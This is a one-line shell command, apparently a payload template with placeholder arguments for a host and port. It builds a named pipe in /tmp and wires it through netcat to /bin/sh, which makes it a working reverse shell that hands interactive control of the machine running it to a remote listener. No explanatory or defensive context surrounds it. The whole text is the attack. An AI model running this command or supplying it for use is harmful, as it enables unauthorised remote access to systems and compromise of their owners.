cd /tmp;rm -f /tmp/p;mknod /tmp/p p&&nc $$ARGV1 $$ARGV2 0<p|/bin/sh 1>p
